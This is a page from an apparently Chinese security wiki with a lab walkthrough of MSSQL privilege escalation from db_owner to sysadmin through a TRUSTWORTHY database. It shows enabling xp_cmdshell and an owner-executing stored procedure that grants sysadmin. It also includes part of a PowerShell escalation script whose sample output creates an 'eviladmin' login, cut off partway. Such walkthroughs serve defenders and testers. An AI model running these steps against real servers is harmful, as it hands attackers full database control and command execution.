<!DOCTYPE html>
<html lang="en">
<head>
  
  
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta name="author" content="内部使用">
    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Mssql/Mssql%20%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/">
    <link rel="shortcut icon" href="../../../favicon.ico">
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
    <title>Mssql 受信用数据库提权 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
    <link href="../../../css/base.css" rel="stylesheet">
    <link rel="stylesheet" href="../../../css/highlight.css">
    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
    <![endif]-->

    <script src="../../../js/jquery-3.2.1.min.js"></script>
    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
    <script src="../../../js/highlight.pack.js"></script>
    
    <base target="_top">
    <script>
      var base_url = '../../..';
      var is_top_frame = false;
        
        var pageToc = [
          {title: "Mssql \u53d7\u4fe1\u7528\u6570\u636e\u5e93\u63d0\u6743", url: "#_top", children: [
              {title: "0x01 \u524d\u63d0", url: "#0x01" },
              {title: "0x02\u521b\u5efa\u7528\u6237\uff0c\u53d7\u4fe1\u7528\u6570\u636e\u5e93", url: "#0x02" },
              {title: "0x02 \u63d0\u6743", url: "#0x02_1" },
              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_1" },
          ]},
        ];

    </script>
    <script src="../../../js/base.js"></script>
      <script src="../../../search/main.js"></script> 
</head>

<body>
<script>
if (is_top_frame) { $('body').addClass('wm-top-page'); }
</script>



<div class="container-fluid wm-page-content">
  <a name="_top"></a>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Mssql%20%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Mssql%20%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83/" class="btn btn-xs btn-link">
        Mssql 模拟登录提权
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Monstra%20CMS/%EF%BC%88CVE-2020-13384%EF%BC%89Monstra%20CMS%203.0.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Monstra%20CMS/%EF%BC%88CVE-2020-13384%EF%BC%89Monstra%20CMS%203.0.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2020-13384）Monstra CMS 3.0.4 任意文件上传漏洞
      </a>
    </div>
    
  </div>

    

    <h1 id="mssql">Mssql 受信用数据库提权<a class="headerlink" href="#mssql" title="Permanent link">&para;</a></h1>
<h2 id="0x01">0x01 前提<a class="headerlink" href="#0x01" title="Permanent link">&para;</a></h2>
<p>前提条件，我们获取sqlserver一个名为MyAppUser01
的用户密码，这个用户对MyTestdb01有db_owner权限，并且对MyTestdb01受信用，然后我们可以利用这个用户提权到syadmin权限</p>
<p>测试服务器版本</p>
<p><img alt="1.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId22.png" /></p>
<h2 id="0x02">0x02创建用户，受信用数据库<a class="headerlink" href="#0x02" title="Permanent link">&para;</a></h2>
<h4 id="1">1.创建数据库<a class="headerlink" href="#1" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>CREATE DATABASE MyTestdb01
SELECT suser_sname(owner_sid)
FROM sys.databases
WHERE name = &#39;MyTestdb01&#39;
</code></pre></div>

<p><img alt="2.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId25.png" /></p>
<h4 id="2">2.创建用户<a class="headerlink" href="#2" title="Permanent link">&para;</a></h4>
<p>创建一个测试用户</p>
<div class="codehilite"><pre><span></span><code>CREATE LOGIN MyAppUser01 WITH PASSWORD = &#39;MyPassword!&#39;;
</code></pre></div>

<p><img alt="3.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId27.png" /></p>
<p>这里可以看到用户为public角色</p>
<h4 id="3mytestdb01myappuser01db_owner">3.在\"MyTestdb01\"数据库中为\"MyAppUser01\"分配\"db_owner\"角色,<a class="headerlink" href="#3mytestdb01myappuser01db_owner" title="Permanent link">&para;</a></h4>
<p>DB_owner权限，DB是database的缩写，owner即拥有者的意思。它是指某个数据库的拥有者，它拥有了对数据库的修改、删除、新增数据表，执行大部分存储过程的权限。</p>
<div class="codehilite"><pre><span></span><code><span class="k">USE</span><span class="w"> </span><span class="n">MyTestdb01</span>
<span class="k">ALTER</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="o">[</span><span class="n">MyAppUser01</span><span class="o">]</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">default_database</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">[</span><span class="n">MyTestdb01</span><span class="o">]</span><span class="p">;</span>
<span class="k">CREATE</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="o">[</span><span class="n">MyAppUser01</span><span class="o">]</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="o">[</span><span class="n">MyAppUser01</span><span class="o">]</span><span class="p">;</span>
<span class="k">EXEC</span><span class="w"> </span><span class="n">sp_addrolemember</span><span class="w"> </span><span class="o">[</span><span class="n">db_owner</span><span class="o">]</span><span class="p">,</span><span class="w"> </span><span class="o">[</span><span class="n">MyAppUser01</span><span class="o">]</span><span class="p">;</span>
</code></pre></div>

<p><img alt="4.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId29.png" /></p>
<h4 id="4myappuser01db_owner">4.确认\"MyAppUser01\"已添加为db_owner<a class="headerlink" href="#4myappuser01db_owner" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>select rp.name as database_role, mp.name as database_user
from sys.database_role_members drm
join sys.database_principals rp on (drm.role_principal_id = rp.principal_id)
join sys.database_principals mp on (drm.member_principal_id = mp.principal_id)
</code></pre></div>

<p><img alt="5.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId31.png" /></p>
<p>Myappuser01确实为db_owner的权限</p>
<p><img alt="6.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId32.png" /></p>
<p>查看myappusr01的属性也可以看到</p>
<h4 id="5mytestdb01">5.将\"MyTestdb01\"数据库设置为受信任。<a class="headerlink" href="#5mytestdb01" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>ALTER DATABASE MyTestdb01 SET TRUSTWORTHY ON
</code></pre></div>

<p><img alt="7.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId34.png" /></p>
<h4 id="6sql-servermytestdb01-msdb">6.下面的查询将返回SQL Server实例中的所有数据库，并且应将\"MyTestdb01 \"和\"MSDB\"数据库标记为可信任。<a class="headerlink" href="#6sql-servermytestdb01-msdb" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code>SELECT a.name,b.is_trustworthy_on
FROM master..sysdatabases as a
INNER JOIN sys.databases as b
ON a.name=b.name;
</code></pre></div>

<p><img alt="8.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId36.png" /></p>
<p>\"1\"就是受信用</p>
<h4 id="7xp_cmdshell">7.开启xp_cmdshell<a class="headerlink" href="#7xp_cmdshell" title="Permanent link">&para;</a></h4>
<div class="codehilite"><pre><span></span><code><span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;show advanced options&#39;</span><span class="p">,</span><span class="mi">1</span>
<span class="k">RECONFIGURE</span>
<span class="k">GO</span>

<span class="k">EXEC</span><span class="w"> </span><span class="n">sp_configure</span><span class="w"> </span><span class="s1">&#39;xp_cmdshell&#39;</span><span class="p">,</span><span class="mi">1</span>
<span class="k">RECONFIGURE</span>
<span class="k">GO</span>
</code></pre></div>

<p><img alt="9.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId38.png" /></p>
<h2 id="0x02_1">0x02 提权<a class="headerlink" href="#0x02_1" title="Permanent link">&para;</a></h2>
<p>1.使用MyAppUser01用户登录，新建查询，看看我们的权限，这里不要用之前的查询，因为那是sa的查询看看我们的是否为sysadmin</p>
<p><img alt="10.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId40.png" /></p>
<p>2.新建一个sp_elevate_me查询</p>
<div class="codehilite"><pre><span></span><code><span class="k">USE</span><span class="w"> </span><span class="n">MyTestdb01</span>
<span class="k">GO</span>
<span class="k">CREATE</span><span class="w"> </span><span class="k">PROCEDURE</span><span class="w"> </span><span class="n">sp_elevate_me</span>
<span class="k">WITH</span><span class="w"> </span><span class="k">EXECUTE</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">OWNER</span>
<span class="k">AS</span>
<span class="k">EXEC</span><span class="w"> </span><span class="n">sp_addsrvrolemember</span><span class="w"> </span><span class="s1">&#39;MyAppUser01&#39;</span><span class="p">,</span><span class="s1">&#39;sysadmin&#39;</span>
<span class="k">GO</span>
</code></pre></div>

<p><img alt="11.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId41.png" /></p>
<p>3.提权至sysadmin</p>
<div class="codehilite"><pre><span></span><code>USE MyTestdb01
EXEC sp_elevate_me
</code></pre></div>

<p><img alt="12.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId42.png" /></p>
<p>再次检查权限</p>
<p><img alt="13.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId43.png" /></p>
<p>已经是sysadmin权限了，查看用户的属性也可以看到已经到sysadmin权限了</p>
<p><img alt="14.png" src="../resource/Mssql%E5%8F%97%E4%BF%A1%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/media/rId44.png" /></p>
<p>这里可以利用脚本已经一键利用</p>
<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
<blockquote>
<p>Invoke-SqlServer-Escalate-Dbowner.psm1</p>
</blockquote>
<div class="codehilite"><pre><span></span><code><span class="k">function</span><span class="w"> </span><span class="nf">Invoke</span><span class="o">-</span><span class="n">SqlServer</span><span class="o">-</span><span class="n">Escalate</span><span class="o">-</span><span class="n">DbOwner</span>
<span class="p">{</span>
<span class="w">    </span><span class="o">&lt;</span>#
<span class="w">    </span><span class="p">.</span><span class="n">SYNOPSIS</span>
<span class="w">       </span><span class="n">This</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">escalate</span><span class="w"> </span><span class="n">privileges</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">db_owner</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">Server</span><span class="p">.</span>

<span class="w">    </span><span class="p">.</span><span class="n">DESCRIPTION</span>
<span class="w">       </span><span class="n">This</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">escalate</span><span class="w"> </span><span class="n">privileges</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">db_owner</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">Server</span><span class="p">.</span><span class="n">This</span><span class="w"> </span><span class="n">is</span><span class="w"> </span>
<span class="w">       </span><span class="n">possible</span><span class="w"> </span><span class="n">when</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">db_owner</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">trusted</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">owned</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="p">.</span><span class="w">  </span>
<span class="w">       </span><span class="n">This</span><span class="w"> </span><span class="n">script</span><span class="w"> </span><span class="n">can</span><span class="w"> </span><span class="n">accept</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">Credentials</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">use</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">user</span><span class="o">&#39;</span><span class="n">s</span><span class="w"> </span><span class="n">trusted</span><span class="w"> </span><span class="n">connection</span><span class="p">.</span>

<span class="w">    </span><span class="p">.</span><span class="n">EXAMPLE</span>
<span class="w">       </span><span class="n">Getting</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">db_owner</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">trusted</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">owned</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="p">.</span>

<span class="w">       </span><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="o">\&gt;</span><span class="w"> </span><span class="n">Invoke</span><span class="o">-</span><span class="n">SqlServer</span><span class="o">-</span><span class="n">Escalate</span><span class="o">-</span><span class="n">DbOwner</span><span class="w"> </span><span class="o">-</span><span class="n">SqlUser</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="o">-</span><span class="n">SqlPass</span><span class="w"> </span><span class="n">MyPassword</span>!<span class="w"> </span><span class="o">-</span><span class="n">SqlServerInstance</span><span class="w"> </span><span class="n">SQLServer1</span><span class="o">\</span><span class="n">SQLEXPRESS</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Attempting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">SQLServer</span><span class="o">\</span><span class="n">SQLEXPRESS</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">myappuser</span><span class="k">...</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Connected</span><span class="p">.</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Enumerating</span><span class="w"> </span><span class="n">accessible</span><span class="w"> </span><span class="n">trusted</span><span class="w"> </span><span class="n">databases</span><span class="w"> </span><span class="n">owned</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">sysadmins</span><span class="k">...</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">accessible</span><span class="w"> </span><span class="n">databases</span><span class="w"> </span><span class="n">found</span><span class="p">.</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Checking</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">current</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">db_owner</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="nb">any</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">them</span><span class="k">...</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">db_owner</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">databases</span><span class="p">.</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Attempting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">evelate</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">master</span><span class="w"> </span><span class="n">database</span><span class="k">...</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Success</span>!<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nb">now</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="p">.</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">All</span><span class="w"> </span><span class="n">done</span><span class="p">.</span>

<span class="w">    </span><span class="p">.</span><span class="n">EXAMPLE</span>
<span class="w">       </span><span class="n">Creating</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">sysadmin</span><span class="p">,</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">that</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">db_owner</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">trusted</span><span class="w"> </span><span class="n">database</span><span class="w"> </span><span class="n">owned</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="p">.</span>

<span class="w">       </span><span class="n">PS</span><span class="w"> </span><span class="n">C</span><span class="p">:</span><span class="o">\&gt;</span><span class="w"> </span><span class="n">Invoke</span><span class="o">-</span><span class="n">SqlServer</span><span class="o">-</span><span class="n">Escalate</span><span class="o">-</span><span class="n">DbOwner</span><span class="w"> </span><span class="o">-</span><span class="n">SqlUser</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="o">-</span><span class="n">SqlPass</span><span class="w"> </span><span class="n">MyPassword</span>!<span class="w"> </span><span class="o">-</span><span class="n">SqlServerInstance</span><span class="w"> </span><span class="n">SQLServer1</span><span class="o">\</span><span class="n">SQLEXPRESS</span><span class="w"> </span><span class="o">-</span><span class="n">newuser</span><span class="w"> </span><span class="n">eviladmin</span><span class="w"> </span><span class="o">-</span><span class="n">newPass</span><span class="w"> </span><span class="n">MyPassword</span>!
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Attempting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">Connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">SQLServer1</span><span class="o">\</span><span class="n">SQLEXPRESS</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">myappuser</span><span class="k">...</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Connected</span><span class="p">.</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Enumerating</span><span class="w"> </span><span class="n">accessible</span><span class="w"> </span><span class="n">trusted</span><span class="w"> </span><span class="n">databases</span><span class="w"> </span><span class="n">owned</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">sysadmins</span><span class="k">...</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Found</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">trusted</span><span class="w"> </span><span class="n">databases</span><span class="w"> </span><span class="n">owned</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="p">.</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Checking</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">db_owner</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="nb">any</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">them</span><span class="k">...</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">myappuser</span><span class="w"> </span><span class="n">has</span><span class="w"> </span><span class="n">db_owner</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">databases</span><span class="p">.</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Attempting</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="nb">add</span><span class="w"> </span><span class="n">eviladmin</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">sysadmin</span><span class="w"> </span><span class="n">role</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">MyAppDb</span><span class="w"> </span><span class="n">database</span><span class="k">...</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">Success</span>!<span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">eviladmin</span><span class="w"> </span><span class="n">is</span><span class="w"> </span><span class="nb">now</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">sysadmin</span><span class="p">.</span>
<span class="w">       </span><span class="p">[</span><span class="o">*</span><span class="p">]</span><span class="w"> </span><span class="n">All</span><span class="w"> </span><span class="n">done</span><span class="p">.</span>

<span class="w">    </span><span class="p">.</span><span class="n">LINK</span>
<span class="w">       </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">netspi</span><span class="p">.</span><span class="n">com</span>

<span class="w">    </span><span class="p">.</span><span class="n">NOTES</span>
<span class="w">       </span><span class="n">Author</span><span class="p">:</span><span class="w"> </span><span class="n">Scott</span><span class="w"> </span><span class="n">Sutherland</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">2014</span><span class="p">,</span><span class="w"> </span><span class="n">NetSPI</span>
<span class="w">       </span><span class="n">Version</span><span class="p">:</span><span class="w"> </span><span class="n">Invoke</span><span class="o">-</span><span class="n">SqlServer</span><span class="o">-</span><span class="n">Escalate</span><span class="o">-</span><span class="n">DbOwner</span><span class="p">.</span><span class="n">psm1</span><span class="w"> </span><span class="n">v1</span><span class="p">.</span><span class="mi">0</span>
<span class="w">       </span><span class="n">Comments</span><span class="p">:</span><span class="w"> </span><span class="n">Should</span><span class="w"> </span><span class="n">work</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">Server</span><span class="w"> </span><span class="mi">2005</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">Above</span><span class="p">.</span>
<span class="w">    </span>#<span class="o">&gt;</span>

<span class="w">  </span><span class="p">[</span><span class="n">CmdletBinding</span><span class="p">()]</span>
<span class="w">  </span><span class="n">Param</span><span class="p">(</span>

<span class="w">    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">=</span>$<span class="nb">false</span><span class="p">,</span>
<span class="w">    </span><span class="n">HelpMessage</span><span class="p">=</span><span class="s">&#39;Set SQL Login username.&#39;</span><span class="p">)]</span>
<span class="w">    </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">SqlUser</span><span class="p">,</span>

<span class="w">    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">=</span>$<span class="nb">false</span><span class="p">,</span>
<span class="w">    </span><span class="n">HelpMessage</span><span class="p">=</span><span class="s">&#39;Set SQL Login password.&#39;</span><span class="p">)]</span>
<span class="w">    </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">SqlPass</span><span class="p">,</span>

<span class="w">    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">=</span>$<span class="nb">false</span><span class="p">,</span>
<span class="w">    </span><span class="n">HelpMessage</span><span class="p">=</span><span class="s">&#39;Set SQL Login username.&#39;</span><span class="p">)]</span>
<span class="w">    </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">newuser</span><span class="p">,</span>

<span class="w">    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">=</span>$<span class="nb">false</span><span class="p">,</span>
<span class="w">    </span><span class="n">HelpMessage</span><span class="p">=</span><span class="s">&#39;Set SQL Login password.&#39;</span><span class="p">)]</span>
<span class="w">    </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">newPass</span><span class="p">,</span>

<span class="w">    </span><span class="p">[</span><span class="n">Parameter</span><span class="p">(</span><span class="n">Mandatory</span><span class="p">=</span>$<span class="nb">true</span><span class="p">,</span>
<span class="w">    </span><span class="n">HelpMessage</span><span class="p">=</span><span class="s">&#39;Set target SQL Server instance.&#39;</span><span class="p">)]</span>
<span class="w">    </span><span class="p">[</span><span class="nb">string</span><span class="p">]</span>$<span class="n">SqlServerInstance</span>

<span class="w">  </span><span class="p">)</span>

<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>
<span class="w">    </span>#<span class="w"> </span><span class="n">Connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">sql</span><span class="w"> </span><span class="n">server</span>
<span class="w">    </span>#<span class="w"> </span><span class="o">-----------------------------------------------</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Create</span><span class="w"> </span><span class="n">fun</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="n">object</span>
<span class="w">    </span>$<span class="n">conn</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="n">New</span><span class="o">-</span><span class="n">Object</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="n">Data</span><span class="p">.</span><span class="n">SqlClient</span><span class="p">.</span><span class="n">SqlConnection</span>

<span class="w">    </span>#<span class="w"> </span><span class="n">Set</span><span class="w"> </span><span class="n">authentication</span><span class="w"> </span><span class="nb">type</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">create</span><span class="w"> </span><span class="n">connection</span><span class="w"> </span><span class="nb">string</span><span class="w">    </span>
